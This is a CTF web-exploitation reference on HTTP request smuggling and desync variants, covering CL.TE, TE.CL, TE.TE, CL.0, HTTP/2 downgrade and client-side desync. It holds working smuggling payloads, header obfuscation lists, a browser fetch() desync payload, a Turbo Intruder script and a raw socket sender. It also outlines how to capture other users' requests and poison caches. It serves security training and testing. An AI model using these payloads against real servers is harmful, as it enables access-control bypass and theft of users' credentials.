# CTF Web - HTTP Request Smuggling & Desync

Full desync taxonomy for CWEE-style challenges: front-end/back-end parser disagreement (CL.TE, TE.CL, TE.TE), CL.0, HTTP/2 downgrade (H2.CL / H2.TE / H2.0), request tunnelling, client-side desync (CSD), and browser-powered / pause-based desync. Detection, confirmation, and exploitation with HTTP Request Smuggler and Turbo Intruder. For the narrow cache-proxy leftover-body variant see [client-side.md](client-side.md#http-request-smuggling-via-cache-proxy); for the single-packet timing engine reused here see [race-conditions.md](race-conditions.md#single-packet-attack-http2); for CRLF-driven request smuggling out of SSRF/deser gadgets see [server-side-advanced-3.md](server-side-advanced-3.md#soapclient-_user_agent-crlf-method-smuggling-35c3-2018).

## Table of Contents
- [When to Suspect Desync](#when-to-suspect-desync)
- [Core Model: Two Parsers, One Stream](#core-model-two-parsers-one-stream)
- [Detection Methodology (Timing First)](#detection-methodology-timing-first)
- [CL.TE](#clte)
- [TE.CL](#tecl)
- [TE.TE (Obfuscated Transfer-Encoding)](#tete-obfuscated-transfer-encoding)
- [CL.0 and H2.0](#cl0-and-h20)
- [HTTP/2 Downgrade: H2.CL and H2.TE](#http2-downgrade-h2cl-and-h2te)
- [Request Tunnelling](#request-tunnelling)
- [Client-Side Desync (CSD)](#client-side-desync-csd)
- [Browser-Powered / Pause-Based Desync](#browser-powered--pause-based-desync)
- [HTTP Request Smuggler (Burp) Workflow](#http-request-smuggler-burp-workflow)
- [Turbo Intruder Confirmation Harness](#turbo-intruder-confirmation-harness)
- [Raw Python Socket Sender](#raw-python-socket-sender)
- [Exploitation Primitives](#exploitation-primitives)
- [Whitebox Tells](#whitebox-tells)

---

## When to Suspect Desync

- Architecture with a **front-end** (CDN, reverse proxy, load balancer: Cloudflare, Akamai, nginx, HAProxy, ALB, Varnish, Apache Traffic Server) forwarding to a **back-end** over a **reused keep-alive connection**. Reuse is the precondition — without it, poisoned bytes never reach a victim.
- Any control you can reach only from the back-end: `/admin`, `X-Forwarded-For`-trusted internal routes, headers the front-end strips.
- Front-end normalizes/routes on HTTP/2 but speaks HTTP/1.1 to the back-end (downgrade) → H2.CL/H2.TE surface.
- CTF shape: two containers in `docker-compose` (proxy + app), a "you can't reach /flag directly, only the proxy talks to it" note, or a bot that browses through the same proxy you do (victim for cache poisoning / CSD).

---

## Core Model: Two Parsers, One Stream

Smuggling exists when the front-end and back-end disagree on **where request 1 ends**. The disagreement source is almost always message-length: `Content-Length` (CL) vs `Transfer-Encoding: chunked` (TE). Naming is `<front-end>.<back-end>`:

- **CL.TE** — front-end uses Content-Length, back-end uses Transfer-Encoding.
- **TE.CL** — front-end uses Transfer-Encoding, back-end uses Content-Length.
- **TE.TE** — both support TE but one is tricked into ignoring it via header obfuscation.
- **CL.0** — back-end ignores Content-Length entirely (treats request as bodyless); the body becomes a new request.
- **H2.CL / H2.TE** — front-end speaks h2 (which has its own length framing), downgrades to h1, and injects a smuggled CL/TE that the back-end honors.

Leftover ("smuggled") bytes sit at the front of the back-end's buffer and prefix the **next** request on that connection — either your own follow-up (self-desync, for control bypass) or a victim's (poisoning, for credential capture).

RFC 7230 rule that everyone should follow but many don't: **if both CL and TE are present, TE wins and CL must be ignored.** Every classic desync is a party violating this.

---

## Detection Methodology (Timing First)

Never confirm smuggling by breaking the site for others first. Use **timing** and **self-desync** probes that are safe and self-contained.

**Baseline.** Downgrade to HTTP/1.1 for manual work (Burp Repeater → Inspector → HTTP/1.1, or `curl --http1.1`). Confirm connection reuse: two pipelined requests on one socket both get answered.

**CL.TE timing probe** — if back-end uses TE, it waits for a terminating chunk that never comes → time delay:
```
POST / HTTP/1.1
Host: victim
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
Front-end (CL=4) forwards `1\r\nA\r\nX`; back-end (TE) reads chunk `A`, then blocks waiting for the next chunk size (`X` is not a valid terminator) → **hang**. Delay ≈ target read timeout ⇒ CL.TE.

**TE.CL timing probe** — front-end uses TE and waits for a chunk the back-end (CL) has already truncated:
```
POST / HTTP/1.1
Host: victim
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
Send with a deliberately short body relative to the TE framing to induce the front-end to block. (Burp's *HTTP Request Smuggler* automates both timing probes — prefer it, it tunes the exact byte counts per target.)

**Golden rule:** a **time delay** is a strong signal but the **only** rigorous confirmation is a self-contained differential: smuggle a prefix that changes the response to *your own* immediately-following request (e.g. turns a `404` into a `200`, or a `403` into `301`). See each variant below.

---

## CL.TE

Front-end honors Content-Length, back-end honors Transfer-Encoding.

```
POST / HTTP/1.1
Host: victim
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: x
```
Front-end forwards the whole body (CL=49). Back-end reads chunked: `0\r\n\r\n` terminates request 1 immediately; the remaining `GET /admin...` is buffered as the **start of request 2**. The next request on that connection gets prefixed → `GET /admin` runs with the victim's/your trailing bytes.

Confirmation (self-contained): smuggle a prefix so your own next normal request returns something impossible without the prefix.

---

## TE.CL

Front-end honors Transfer-Encoding, back-end honors Content-Length.

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
Front-end (TE) reads chunk of size `0x5c`, then `0\r\n\r\n` ends it, forwarding the whole thing. Back-end (CL=4) reads only `5c\r\n` (4 bytes) as request 1's body; everything from `GPOST` onward is a smuggled second request. Note the trailing `\r\n\r\n` — the smuggled request needs a complete terminator or it stalls waiting for a victim's bytes.
Chunk size must be the **hex byte length of the smuggled request block**. Miscount and it hangs — count carefully or let Request Smuggler compute it.

---

## TE.TE (Obfuscated Transfer-Encoding)

Both ends parse TE, so induce **one** end to ignore it via a malformed TE header. Whichever end rejects the obfuscated header falls back to CL → reduces to CL.TE or TE.CL. Rotate obfuscations:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding:\tchunked          (tab)
Transfer-Encoding: chunked\r\n        (then a second) Transfer-encoding: cow
Transfer-Encoding\r\n: chunked        (folded / obs-fold)
Transfer-Encoding: chunk             (typo prefix match)
Transfer-Encoding:[0x0b]chunked      (vertical tab / other WS)
X: X[0x0a]Transfer-Encoding: chunked (LF-embedded smuggled header)
```
Send a duplicate TE where the first is valid and the second obfuscated (or vice-versa) and time-probe: if one end drops one of them you have a differential.

---

## CL.0 and H2.0

**CL.0**: the back-end ignores the request body entirely for certain endpoints (common for GET handlers, static routes, redirects, or servers that don't read the body). The body is then interpreted as a fresh request on the connection.
```
POST /static/favicon.ico HTTP/1.1
Host: victim
Content-Length: 34

GET /admin HTTP/1.1
Foo: bar
```
Front-end forwards body (CL=34); back-end serves `/static/favicon.ico` and **discards** the body, leaving `GET /admin...` as request 2. Test candidate endpoints: static files, OPTIONS, server-error paths, endpoints that respond before reading the body.
**Confirmation:** issue this then a normal request on the same connection (Burp "Send group in sequence, single connection"); if the normal request's response is `/admin`'s, it's CL.0.

**H2.0**: same idea over an HTTP/2 front-end — the h2 request has no body semantics the back-end honors after downgrade, so a smuggled h1 request in the h2 body/pseudo-headers is treated as the next request.

---

## HTTP/2 Downgrade: H2.CL and H2.TE

When the front-end speaks HTTP/2 to the client but HTTP/1.1 to the back-end, it rebuilds an h1 request from h2 frames. HTTP/2 has its **own** length (frame `content-length` is advisory); if the front-end trusts an h2-supplied `content-length`/`transfer-encoding` header and forwards it downgraded, the back-end desyncs.

Send these via a client that lets you set raw h2 headers (Burp Repeater in HTTP/2 mode, or `nghttp2`/custom). **Do not** let the client auto-fix the length.

**H2.TE** — smuggle `transfer-encoding: chunked` as an h2 header; front-end downgrades it into the h1 request, back-end chunk-parses:
```
:method   POST
:path     /
:authority victim
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: victim
Foo: bar
```

**H2.CL** — send an h2 `content-length` shorter than the real body; back-end (post-downgrade) reads only CL bytes, rest is smuggled:
```
:method   POST
:path     /
:authority victim
content-length 0

GET /admin HTTP/1.1
Host: victim
Foo: bar
```
h2-specific enablers: **header/pseudo-header injection via `\r\n` in an h2 header value** (h2 has no line framing, so a value containing CRLF becomes multiple h1 headers after downgrade), and **request-line injection** via a crafted `:path` or `:method`. Try newline in an h2 header value:
```
foo   bar\r\nTransfer-Encoding: chunked
```

---

## Request Tunnelling

When connection reuse is off (front-end opens a fresh back-end connection per request) classic poisoning of *other users* fails, but you can still **tunnel** a second request/response to yourself — useful to reach internal headers the front-end adds (e.g. read what `X-Forwarded-For`/auth headers the proxy injects) or to smuggle past front-end WAF. The smuggled response is appended to yours; look for it concatenated after the expected body. HTTP/2 makes this cleaner because the front-end reads exactly one h2 response but the back-end sent two h1 responses — the second leaks. Detect by diffing response length vs expected, or by smuggling a request whose response echoes injected headers.

---

## Client-Side Desync (CSD)

No back-end mis-parse needed — the **victim's own browser** is the smuggling client. Requires a server that (a) ignores the body on some endpoint (CL.0-style) and (b) keeps the connection alive. The attacker page uses `fetch()` to send a request whose body is a smuggled second request; the browser reuses the connection for the victim's next same-origin navigation, which gets prefixed.

```html
<script>
fetch('https://victim/', {
  method: 'POST',
  // browser sends Content-Length automatically; body is the smuggled request
  body: "GET /admin/delete?user=carlos HTTP/1.1\r\nHost: victim\r\nFoo: bar",
  mode: 'no-cors',
  credentials: 'include'
}).then(() => {
  // second fetch reuses the poisoned connection -> gets prefixed
  location = 'https://victim/';
});
</script>
```
CSD turns a same-site desync into a fully client-side attack (no proxy needed) and can escalate to stored/reflected XSS on any reflected sink. Confirm the endpoint is CL.0 first (see above). Works only where the browser will reuse the TCP/TLS connection (same origin, HTTP/1.1, keep-alive).

---

## Browser-Powered / Pause-Based Desync

**Pause-based CL.0 / connection-locked desync:** some servers (and front-ends that only read the body if it arrives promptly) can be desynced by **pausing** mid-request. Send headers + partial body, pause past the server's header-read point so it responds to request 1 treating the connection as done, then release the rest as request 2. Turbo Intruder exposes this via `gate`/timed release; Burp Repeater has "send with a pause".

**Server-side pause desync** targets first-request-only routing: front-ends that route on the first request's headers but reuse the socket. Combine with a slow-body pause to split.

These are the vectors that expand smuggling to CDNs and to victims' browsers; if a straightforward CL/TE probe fails but connection reuse exists, escalate to pause-based and CSD before giving up.

---

## HTTP Request Smuggler (Burp) Workflow

James Kettle's extension (BApp Store) is the fastest confirmation path:
1. Right-click request → **Smuggle probe** → it runs CL.TE, TE.CL, TE.TE and reports "CL.TE/TE.CL potential" with a **timeout differential**. It auto-generates a poison request.
2. Right-click → **Launch smuggle attack** to weaponize (repeatedly poison to catch a victim).
3. Use **Content-Length: auto** header hint and the "Extend HTTP/1 line endings" and h2-downgrade options for CDN targets.
4. Turn off Repeater's "Update Content-Length" for manual crafting, and use **`\r\n` normalization off**.
5. For h2: set Repeater to HTTP/2, use the **Inspector** to add raw h2 headers with embedded CRLF; enable "Allow HTTP/2 ALPN override" to force downgrade behavior.

Confirmation loop for CTF: send poison request on connection, then a benign request; if the benign request's response reflects the smuggled prefix (status flip, admin body, injected header echo), you have it — capture the exact bytes for the writeup.

---

## Turbo Intruder Confirmation Harness

Reuses the single-packet/last-byte engine from [race-conditions.md](race-conditions.md#turbo-intruder-single-packet-template). This fires a poison + follow-up on one connection to prove a self-contained desync (status flip):

```python
# smuggle_confirm.py  — Burp -> Extensions -> Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    # CL.TE poison: smuggles a prefix that makes the NEXT request hit /admin
    poison = (
        "POST / HTTP/1.1\r\n"
        "Host: victim\r\n"
        "Content-Length: 45\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "X-Foo: "                      # dangling header eats the follow-up's request line
    )
    follow = (
        "GET / HTTP/1.1\r\n"
        "Host: victim\r\n"
        "\r\n"
    )
    # Same connection: poison first, then the victim/self request that gets prefixed
    engine.queue(poison)
    engine.queue(follow)

def handleResponse(req, interesting):
    # Flag the follow-up whose body/status came from /admin
    table.add(req)
```
Adjust `Content-Length` so the front-end forwards the whole `0\r\n\r\nGET /admin...` block; the trailing `X-Foo: ` swallows the follow-up's `GET / HTTP/1.1` request line so `/admin` is what actually executes. Watch `handleResponse` for a status/length differential between the two queued requests.

For **TE.CL**, set the chunk size to the exact hex length of the smuggled block and keep `Content-Length` small (the front-end reads TE, back-end reads CL). For **pause-based/CL.0**, add a partial body and use `engine.openGate()` / timed release to pause before the final bytes.

---

## Raw Python Socket Sender

When you need byte-exact control (no library rewrites headers). Two pipelined requests on one socket:

```python
import socket, ssl

HOST, PORT, TLS = "victim", 443, True
poison = (
    b"POST / HTTP/1.1\r\n"
    b"Host: victim\r\n"
    b"Content-Length: 45\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"0\r\n\r\n"
    b"GET /admin HTTP/1.1\r\n"
    b"X-Foo: "
)
follow = b"GET / HTTP/1.1\r\nHost: victim\r\n\r\n"

s = socket.create_connection((HOST, PORT))
if TLS:
    s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
s.sendall(poison)          # 1st: back-end buffers the smuggled prefix
import time; time.sleep(0.3)
s.sendall(follow)          # 2nd: gets prefixed -> executes /admin
data = b""
s.settimeout(4)
try:
    while True:
        chunk = s.recv(65535)
        if not chunk: break
        data += chunk
except socket.timeout:
    pass
print(data.decode(errors="replace"))
```
Disable Nagle if you need distinct segments: `s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)`. For h2 downgrade you cannot use this raw h1 sender — use Burp/`nghttp2`.

---

## Exploitation Primitives

Once you can smuggle a prefix, escalate:
- **Bypass front-end access control** — reach back-end-only routes (`/admin`, internal APIs) the proxy would block. Self-desync is enough (no victim needed).
- **Capture other users' requests** — smuggle a request whose body is a long `Content-Length`; the victim's next request bytes complete it and get **stored** (e.g. in a comment/profile you can read). This steals cookies/auth headers. See the cache-proxy leftover-body variant in [client-side.md](client-side.md#http-request-smuggling-via-cache-proxy).
- **Web cache poisoning** — smuggle a request whose response the shared cache stores under a benign, high-traffic URL; poison it with an XSS/redirect body. Combine with unkeyed-header tricks. (Cache poisoning/deception basics: [client-side.md](client-side.md#cache-poisoning).)
- **Reflected → stored XSS / open redirect delivery** — turn a reflected sink into one that fires for the next victim on the connection.
- **Response queue poisoning** — desync so responses shift by one; every subsequent user on that connection gets the previous user's response (mass account takeover). High-impact, noisy — CTF flag is usually the admin's response body.
- **Internal header injection** — smuggle past the point where the front-end adds `X-Forwarded-For`/auth, spoofing trust.

---

## Whitebox Tells

In supplied source / configs, look for:
- A reverse proxy config (nginx `proxy_pass` with `keepalive`, HAProxy `http-reuse always`, Apache `mod_proxy` with persistent connections) in front of an app that does its own HTTP parsing.
- Custom HTTP parsers / hand-rolled socket servers reading `Content-Length` and `Transfer-Encoding` independently — check whether they **reject** requests carrying both (RFC 7230 says reject or prefer TE). If they silently pick one, that's the bug.
- Servers that read the body lazily (respond before consuming it) → CL.0 candidates (many Go `net/http` handlers, static file servers, redirect handlers).
- HTTP/2 front-end (`listen 443 http2` / ALPN h2) proxying to an HTTP/1.1 upstream → downgrade surface; check whether the proxy strips client-supplied `transfer-encoding`/`content-length` before downgrading.
- Any place a header value can contain a raw `\r\n` / `\n` (h2 header injection, CRLF from user input into an outbound request) — see the SoapClient CRLF gadget in [server-side-advanced-3.md](server-side-advanced-3.md#soapclient-_user_agent-crlf-method-smuggling-35c3-2018).
